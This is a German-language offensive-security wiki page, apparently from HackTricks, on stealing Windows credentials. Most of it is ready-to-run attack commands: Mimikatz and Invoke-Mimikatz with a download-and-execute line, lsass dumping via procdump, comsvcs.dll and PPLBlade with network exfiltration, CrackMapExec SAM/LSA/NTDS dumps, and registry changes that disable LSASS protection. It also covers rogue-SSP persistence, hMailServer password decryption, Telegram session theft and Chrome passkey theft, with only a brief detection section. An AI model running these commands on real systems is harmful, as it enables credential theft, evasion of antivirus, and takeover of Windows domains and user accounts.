# Windows-Anmeldeinformationen stehlen

{{#include ../../banners/hacktricks-training.md}}

## Anmeldeinformationen mit Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Finde weitere Dinge, die Mimikatz auf** [**dieser Seite**](credentials-mimikatz.md)** tun kann.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Hier erfahren Sie mehr über einige mögliche Schutzmaßnahmen für Credentials.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten Mimikatz daran hindern, einige Credentials zu extrahieren.**

## Credentials mit Meterpreter

Verwenden Sie das von mir erstellte [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), um **Passwörter und Hashes** innerhalb des Opfers zu **suchen**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool ist**, wird es von Defender nicht erkannt.\
Du kannst dieses Tool verwenden, um den **lsass-Prozess zu dumpen**, den **dump herunterzuladen** und die **Zugangsdaten lokal** aus dem dump zu **extrahieren**.

Du könntest auch [SharpDump](https://github.com/GhostPack/SharpDump) verwenden.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) durchgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Hinweis**: Einige **AV** können die Verwendung von **procdump.exe zum Dumpen von lsass.exe** als **bösartig erkennen**, da sie die Zeichenfolgen **"procdump.exe" und "lsass.exe"** **erkennen**. Daher ist es **unauffälliger**, die **PID** von lsass.exe als **Argument** an procdump zu **übergeben**, anstatt den **Namen lsass.exe** zu verwenden.

### Dumping lsass mit **comsvcs.dll**

Eine DLL namens **comsvcs.dll**, die sich in `C:\Windows\System32` befindet, ist dafür verantwortlich, bei einem Absturz den **Prozessspeicher zu dumpen**. Diese DLL enthält eine **Funktion** namens **`MiniDumpW`**, die mithilfe von `rundll32.exe` aufgerufen werden kann.\
Die Verwendung der ersten beiden Argumente ist irrelevant, das dritte ist jedoch in drei Komponenten unterteilt. Die Prozess-ID, die gedumpt werden soll, bildet die erste Komponente, der Speicherort der Dump-Datei die zweite, und die dritte Komponente ist ausschließlich das Wort **full**. Es gibt keine alternativen Optionen.\
Nach dem Parsen dieser drei Komponenten wird die DLL mit der Erstellung der Dump-Datei beauftragt und überträgt den Speicher des angegebenen Prozesses in diese Datei.\
Die Verwendung von **comsvcs.dll** zum Dumpen des lsass-Prozesses ist möglich, wodurch das Hochladen und Ausführen von procdump überflüssig wird. Diese Methode wird ausführlich unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) beschrieben.<sup>[[9]](#references)</sup>

Der folgende Befehl wird zur Ausführung verwendet:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Diesen Prozess können Sie mit** [**lssasy**](https://github.com/Hackndo/lsassy)** automatisieren.**

### **Dumping von lsass mit Task Manager**

1. Klicken Sie mit der rechten Maustaste auf die Taskleiste und klicken Sie auf Task Manager.
2. Klicken Sie auf Weitere Details.
3. Suchen Sie im Tab Prozesse nach dem Prozess "Local Security Authority Process".
4. Klicken Sie mit der rechten Maustaste auf den Prozess "Local Security Authority Process" und klicken Sie auf "Create dump file".

### Dumping von lsass mit procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist ein von Microsoft signiertes Binary, das Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)-Suite ist.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping von lsass mit PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Tool zum Dumpen geschützter Prozesse, das die Verschleierung von Memory Dumps und deren Übertragung auf Remote-Workstations unterstützt, ohne sie auf der Festplatte abzulegen.

**Wichtige Funktionen**:

1. Umgehen des PPL-Schutzes
2. Verschleiern von Memory-Dump-Dateien, um signaturbasierte Erkennungsmechanismen von Defender zu umgehen
3. Hochladen von Memory Dumps mit RAW- und SMB-Upload-Methoden, ohne sie auf der Festplatte abzulegen (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon liefert einen dreistufigen Dumper namens **LalsDumper**, der niemals `MiniDumpWriteDump` aufruft, sodass EDR-Hooks auf dieser API nie ausgelöst werden:<sup>[[3]](#references)</sup>

1. **Stage-1-Loader (`lals.exe`)** – durchsucht `fdp.dll` nach einem Platzhalter aus 32 kleingeschriebenen `d`-Zeichen, überschreibt ihn mit dem absoluten Pfad zu `rtu.txt`, speichert die gepatchte DLL als `nfdp.dll` und ruft `AddSecurityPackageA("nfdp","fdp")` auf. Dadurch wird **LSASS** gezwungen, die bösartige DLL als neuen Security Support Provider (SSP) zu laden.
2. **Stage 2 innerhalb von LSASS** – wenn LSASS `nfdp.dll` lädt, liest die DLL `rtu.txt`, XORt jedes Byte mit `0x20` und mappt den dekodierten Blob in den Speicher, bevor sie die Ausführung übergibt.
3. **Stage-3-Dumper** – das gemappte Payload implementiert die MiniDump-Logik mithilfe von **direct syscalls** neu, die aus gehashten API-Namen aufgelöst werden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ein dedizierter Export namens `Tom` öffnet `%TEMP%\<pid>.ddt`, schreibt einen komprimierten LSASS-Dump in die Datei und schließt das Handle, sodass die Exfiltration später erfolgen kann.

Hinweise für Operatoren:

* Bewahre `lals.exe`, `fdp.dll`, `nfdp.dll` und `rtu.txt` im selben Verzeichnis auf. Stage 1 ersetzt den fest kodierten Platzhalter durch den absoluten Pfad zu `rtu.txt`; eine Aufteilung der Dateien unterbricht daher die Kette.
* Die Registrierung erfolgt durch Anhängen von `nfdp` an `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Du kannst diesen Wert selbst setzen, damit LSASS den SSP bei jedem Start erneut lädt.
* `%TEMP%\*.ddt`-Dateien sind komprimierte Dumps. Dekomprimiere sie lokal und übergib sie anschließend an Mimikatz/Volatility zur Credential-Extraktion.
* Zum Ausführen von `lals.exe` sind Admin-/SeTcb-Rechte erforderlich, damit `AddSecurityPackageA` erfolgreich ist. Sobald der Aufruf zurückkehrt, lädt LSASS den Rogue-SSP transparent und führt Stage 2 aus.
* Das Entfernen der DLL vom Datenträger entfernt sie nicht aus LSASS. Lösche entweder den Registry-Eintrag und starte LSASS neu (Neustart) oder lasse ihn für langfristige Persistenz bestehen.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA-Secrets dumpen
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### NTDS.dit vom Ziel-DC dumpen
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump der NTDS.dit-Passworthistorie vom Ziel-DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Das Attribut pwdLastSet für jedes NTDS.dit-Konto anzeigen
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM stehlen

Diese Dateien sollten sich in _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM_ befinden. Du kannst sie jedoch **nicht einfach auf reguläre Weise kopieren**, da sie geschützt sind.

### Aus der Registry

Am einfachsten lassen sich diese Dateien stehlen, indem du eine Kopie aus der Registry erhältst:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Lade** diese Dateien auf deine Kali-Maschine **herunter** und **extrahiere die Hashes** mit:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volumeschattenkopie

Sie können mithilfe dieses Dienstes geschützte Dateien kopieren. Sie benötigen Administratorrechte.

#### Using vssadmin

Die vssadmin-Binärdatei ist nur in Windows-Server-Versionen verfügbar
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Aber dasselbe können Sie auch mit **Powershell** tun. Dies ist ein Beispiel dafür, **wie man die SAM-Datei kopiert** (das verwendete Laufwerk ist „C:“ und sie wird unter C:\users\Public gespeichert), aber Sie können dies zum Kopieren jeder geschützten Datei verwenden:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code aus dem Buch: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Schließlich könntest du auch das [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Die Datei **NTDS.dit** gilt als das Herzstück von **Active Directory** und enthält wichtige Daten zu Benutzerobjekten, Gruppen und deren Mitgliedschaften. In ihr werden die **Passwort-Hashes** der Domänenbenutzer gespeichert. Diese Datei ist eine **Extensible Storage Engine (ESE)**-Datenbank und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.

In dieser Datenbank werden drei primäre Tabellen verwaltet:

- **Data Table**: Diese Tabelle speichert Details zu Objekten wie Benutzern und Gruppen.
- **Link Table**: Sie erfasst Beziehungen, beispielsweise Gruppenmitgliedschaften.
- **SD Table**: Hier werden die **Security Descriptors** für jedes Objekt gespeichert, um die Sicherheit und Zugriffskontrolle für die gespeicherten Objekte zu gewährleisten.

Christoffer Anderssons Forschung zur Datenbankebene dokumentiert diese Tabellen und ihr versionsabhängiges Verhalten ausführlicher.<sup>[[8]](#references)</sup>

Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren, und sie wird von _lsass.exe_ verwendet. Daher kann sich ein **Teil** der Datei **NTDS.dit** im Speicher von **`lsass`** befinden (wahrscheinlich findet man dort die zuletzt abgerufenen Daten, da die Performance durch die Verwendung eines **Cache** verbessert wird).

#### Entschlüsseln der Hashes in NTDS.dit

Der Hash wird dreimal verschlüsselt:

1. Den Password Encryption Key (**PEK**) mit dem **BOOTKEY** und **RC4** entschlüsseln.
2. Den **Hash** mit dem **PEK** und **RC4** entschlüsseln.
3. Den **Hash** mit **DES** entschlüsseln.

Der **PEK** hat auf jedem Domänencontroller denselben Wert, ist jedoch in **NTDS.dit** mit dem DC-spezifischen **BOOTKEY** aus der **SYSTEM**-Hive dieses Domänencontrollers verschlüsselt. Daher werden zum Extrahieren von Credentials sowohl **NTDS.dit** als auch **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) benötigt.

### NTDS.dit mit Ntdsutil kopieren

Verfügbar seit Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Du kannst auch den [**volume shadow copy**](#stealing-sam-and-system)-Trick verwenden, um die Datei **ntds.dit** zu kopieren. Denke daran, dass du außerdem eine Kopie der **SYSTEM-Datei** benötigst (erneut kannst du sie [**aus der Registry dumpen oder den volume shadow copy**](#stealing-sam-and-system)-Trick verwenden).

### **Hashes aus NTDS.dit extrahieren**

Sobald du die Dateien **NTDS.dit** und **SYSTEM** **erhalten** hast, kannst du Tools wie _secretsdump.py_ verwenden, um die **Hashes zu extrahieren**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Sie können sie auch **automatisch extrahieren**, indem Sie einen gültigen Domain-Admin-Benutzer verwenden:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Für **große NTDS.dit-Dateien** wird empfohlen, sie mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Schließlich können Sie auch das **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ oder **mimikatz** `lsadump::lsa /inject` verwenden.

### **Domänenobjekte aus NTDS.dit in eine SQLite-Datenbank extrahieren**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Dabei werden nicht nur Geheimnisse, sondern auch die gesamten Objekte und ihre Attribute extrahiert, um weitere Informationen zu gewinnen, sobald die rohe NTDS.dit-Datei abgerufen wurde.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM`-Hive ist optional, ermöglicht jedoch die Entschlüsselung von Secrets (NT- und LM-Hashes, ergänzende Zugangsdaten wie Klartextpasswörter, Kerberos- oder Trust-Keys sowie NT- und LM-Passwortverläufe). Neben anderen Informationen werden folgende Daten extrahiert: Benutzer- und Computerkonten mit ihren Hashes, UAC-Flags, Zeitstempel der letzten Anmeldung und Passwortänderung, Kontobeschreibungen, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, der Baum der Organisationseinheiten und deren Mitgliedschaften, vertrauenswürdige Domänen mit Trust-Typ, -Richtung und -Attributen ...

## Lazagne

Lade die Binärdatei [hier](https://github.com/AlessandroZ/LaZagne/releases) herunter. Du kannst diese Binärdatei verwenden, um Zugangsdaten aus verschiedenen Softwareprogrammen zu extrahieren.
```
lazagne.exe all
```
## Weitere Tools zum Extrahieren von Credentials aus SAM und LSASS

### Windows credentials Editor (WCE)

Dieses Tool kann verwendet werden, um Credentials aus dem Speicher zu extrahieren. Lade es herunter unter: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrahiere Credentials aus der SAM-Datei
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Anmeldedaten aus der SAM-Datei extrahieren
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Lade es herunter von:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) und **execute it** einfach; die Passwörter werden extrahiert.

## Inaktive RDP-Sitzungen auswerten und Sicherheitskontrollen abschwächen

Ink Dragons FinalDraft RAT enthält einen `DumpRDPHistory`-Tasker, dessen Techniken für jeden Red-Teamer nützlich sind:<sup>[[3]](#references)</sup>

### DumpRDPHistory-artige Telemetrieerfassung

* **Ausgehende RDP-Ziele** – parse jeden Benutzer-Hive unter `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Jeder Unterschlüssel speichert den Servernamen, `UsernameHint` und den Zeitstempel der letzten Änderung. Du kannst die Logik von FinalDraft mit PowerShell nachbilden:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Beweise für eingehende RDP-Verbindungen** – frage das Protokoll `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` nach den Ereignis-IDs **21** (erfolgreiche Anmeldung) und **25** (Trennung) ab, um zu ermitteln, wer den Rechner administriert hat:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Sobald du weißt, welcher Domain Admin regelmäßig eine Verbindung herstellt, dump LSASS (mit LalsDumper/Mimikatz), solange dessen **getrennte** Sitzung noch existiert. CredSSP + NTLM fallback hinterlassen ihren Verifier und ihre Tokens in LSASS, die anschließend über SMB/WinRM wiederverwendet werden können, um `NTDS.dit` zu erbeuten oder Persistenz auf Domain Controllern einzurichten.

### Von FinalDraft anvisierte Registry-Downgrades

Dasselbe Implantat manipuliert außerdem mehrere Registry-Schlüssel, um Credential Theft zu erleichtern:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Das Setzen von `DisableRestrictedAdmin=1` erzwingt die vollständige Wiederverwendung von Anmeldedaten/Tickets während RDP und ermöglicht Pivoting nach dem Pass-the-Hash-Prinzip.
* `LocalAccountTokenFilterPolicy=1` deaktiviert die UAC-Token-Filterung, sodass lokale Administratoren über das Netzwerk uneingeschränkte Tokens erhalten.
* `DSRMAdminLogonBehavior=2` ermöglicht es dem DSRM-Administrator, sich anzumelden, während der DC online ist, und stellt Angreifern ein weiteres integriertes Konto mit hohen Berechtigungen zur Verfügung.
* `RunAsPPL=0` entfernt den LSASS-PPL-Schutz, wodurch der Speicherzugriff für Dumper wie LalsDumper trivial wird.

## hMailServer-Datenbank-Anmeldedaten (nach der Kompromittierung)

hMailServer speichert das DB-Passwort in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` unter `[Database] Password=`. Der Wert ist mit dem statischen Schlüssel `THIS_KEY_IS_NOT_SECRET` Blowfish-verschlüsselt und verwendet einen 4-Byte-Word-Endianness-Tausch. Verwende den Hex-String aus der INI mit diesem Python-Snippet:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Mit dem Klartextpasswort die SQL-CE-Datenbank kopieren, um Dateisperren zu vermeiden, den 32-Bit-Provider laden und bei Bedarf ein Upgrade durchführen, bevor die Hashes abgefragt werden:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Die Spalte `accountpassword` verwendet das hMailServer-Hash-Format (hashcat-Modus `1421`). Das Cracken dieser Werte kann wiederverwendbare Zugangsdaten für WinRM/SSH-Pivots liefern.

## Abfangen von LSA-Logon-Callbacks (LsaApLogonUserEx2)

Einige Tools erfassen **Klartext-Anmeldepasswörter**, indem sie den LSA-Logon-Callback `LsaApLogonUserEx2` abfangen. Die Idee besteht darin, den Callback des Authentication Package zu hooken oder zu wrappen, damit Zugangsdaten **während des Logons** (vor dem Hashing) erfasst und anschließend auf die Festplatte geschrieben oder an den Operator zurückgegeben werden. Dies wird üblicherweise als Helper implementiert, der in LSA injiziert oder dort registriert wird und jedes erfolgreiche interaktive oder Netzwerk-Logon-Ereignis mit Benutzername, Domain und Passwort protokolliert.<sup>[[1]](#references)</sup>

Betriebshinweise:
- Erfordert lokale Administratorrechte/SYSTEM, um den Helper in den Authentication Path zu laden.
- Erfasste Zugangsdaten erscheinen nur, wenn ein Logon stattfindet (interaktiver Logon, RDP-, Service- oder Netzwerk-Logon, abhängig vom Hook).

## Gespeicherte SSMS-Verbindungszugangsdaten (sqlstudio.bin)

SQL Server Management Studio (SSMS) speichert gespeicherte Verbindungsinformationen in einer benutzerspezifischen `sqlstudio.bin`-Datei. Dedizierte Dumper können die Datei parsen und gespeicherte SQL-Zugangsdaten wiederherstellen. In Shells, die nur Command Output zurückgeben, wird die Datei häufig exfiltriert, indem sie als Base64 codiert und auf stdout ausgegeben wird.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Auf der Operator-Seite erstellen Sie die Datei neu und führen den Dumper lokal aus, um Zugangsdaten wiederherzustellen:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Telegram Desktop `tdata` session theft

Telegram Desktop speichert Autorisierungs- und Kontostatus in seinem **`tdata`**-Verzeichnis. Eine kopierte Session kann von kompatiblen Tools geladen werden, um sich ohne das Kontopasswort zu authentifizieren, solange diese Autorisierung gültig bleibt; wenn die Verschlüsselung lokaler Daten aktiviert ist, benötigt der Stealer zusätzlich den Passcode. Eine authentifizierte Session kann anschließend Identitätsdaten, Dialog- und Mitgliedschaftsmetadaten, Nachrichten sowie herunterladbare Medien offenlegen.<sup>[[10]](#references)</sup>

### Auffinden und Beschaffung

Durchsuche sowohl installierte als auch portable Layouts. Da die Paketnamen des Microsoft Store variieren, liste Paketverzeichnisse auf, die `TelegramMessenge` enthalten, und untersuche deren Unterverzeichnis `LocalCache\Roaming`.<sup>[[10]](#references)</sup>
```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
Where-Object Name -Like '*TelegramMessenge*' |
ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```
Wenn gewöhnliche Lesezugriffe fehlschlagen und das Prozesstoken `SeBackupPrivilege` **bereits enthält und aktiviert**, bietet der backup-aware Zugriff eine Ausweichmöglichkeit; er beschafft das Privileg nicht und erhöht nicht die Rechte des Prozesses. `CreateFileW` mit `FILE_FLAG_BACKUP_SEMANTICS` kann Backup-/Restore-Semantik anfordern und Dateisicherheitsprüfungen umgehen, wenn die erforderlichen Token-Privilegien vorhanden sind. Das Flag allein hebt jedoch keine inkompatible Freigabesperre auf.<sup>[[10]](#references)[[11]](#references)</sup>

Für live gesperrte Dateien erstellen/lesen Sie eine **Volume Shadow Copy**. Bei durch ACLs blockierten Dateien verwendet `robocopy /B` den Backup-Modus und umgeht Datei- und Verzeichnis-ACLs.<sup>[[10]](#references)[[12]](#references)</sup>
```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```
Ein auf Bandbreite bedachter Implant kann zunächst nur das Dateipfad-Inventar übermitteln, eine Snapshot-ID sowie die bereits vom C2 gespeicherten Pfade erhalten und anschließend nur die fehlenden Dateien hochladen. Daher können auch kleine inkrementelle Übertragungen nach einer rekursiven `tdata`-Aufzählung weiterhin einen erfolgreichen Session-Diebstahl darstellen.<sup>[[10]](#references)</sup>

### Erkennung und Eindämmung

Korrelieren Sie den rekursiven Zugriff auf `tdata` durch einen Nicht-Telegram-Prozess mit der Aktivierung von `SeBackupPrivilege`, Dateiöffnungen mit Backup-Semantik, VSS-Aktivität oder einem untergeordneten `robocopy.exe`, das `/B` verwendet. Suchen Sie außerdem nach einer schnellen Aufzählung von `%APPDATA%` und `%LOCALAPPDATA%\Packages`, gefolgt von ausgehenden Verbindungen durch denselben Prozess. Verwenden Sie nach einer Kompromittierung **Einstellungen → Geräte** (oder **Datenschutz & Sicherheit → Aktive Sitzungen**), um nicht erkannte Sitzungen zu beenden; die Aktivierung der zweistufigen Verifizierung allein widerruft keine bereits gestohlene Autorisierung.<sup>[[10]](#references)[[13]](#references)</sup>

## Passkey- / WebAuthn-Credential-Diebstahl aus Chrome unter Windows

Wenn auf einem Windows-Host mit **Chrome + mit Google Password Manager synchronisierten Passkeys** eine Codeausführung als **betroffener Benutzer** erreicht wird, werden Passkeys zu einem interessanten Post-Exploitation-Ziel, selbst **ohne Admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Interessante lokale Artefakte
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** speichert protobuf-codierte **`WebauthnCredentialSpecifics`**-Datensätze. Ein Prozess desselben Benutzers kann die **RP ID**, den **Benutzernamen**, die **Credential-ID** und verschlüsseltes Material privater Schlüssel für synchronisierte Passkeys aufzählen.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** speichert den lokalen Geräteeinschreibestatus, beispielsweise **`wrapped_identity_private_key`** und das gewrappte Geheimnis, das zur Wiederherstellung synchronisierter Credentials verwendet wird.<sup>[[4]](#references)</sup>

Schnelle Triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### An TPM gebundene Key-Blobs können weiterhin als lokales Signierorakel missbraucht werden

Wenn der Browser einen durch TPM geschützten Identitätsschlüssel als **`NCRYPT_OPAQUE_KEY_BLOB`** exportiert und dieses Blob in einem für Benutzer zugänglichen Zustand speichert, muss Malware den privaten Schlüssel nicht im Klartext extrahieren. Sie kann das Blob einfach auf **demselben Computer** erneut importieren und das lokale TPM auffordern, vom Angreifer kontrollierte Daten zu signieren:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Dies bedeutet: **Hardware-Bindung verhindert den Export außerhalb des Geräts, aber nicht die Nutzung durch denselben Benutzer auf dem kompromittierten Endpunkt**.

### Praktische Missbrauchswege

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- `WebauthnCredentialSpecifics` aus Chromes LevelDB aufzählen.
- Einen Passkey-Login starten und eine frische WebAuthn-Challenge erhalten.
- Den gestohlenen Blob `wrapped_identity_private_key` auf dem TPM des Opfers verwenden, um die Binding-Anfrage des Cloud-Authenticators zu signieren.
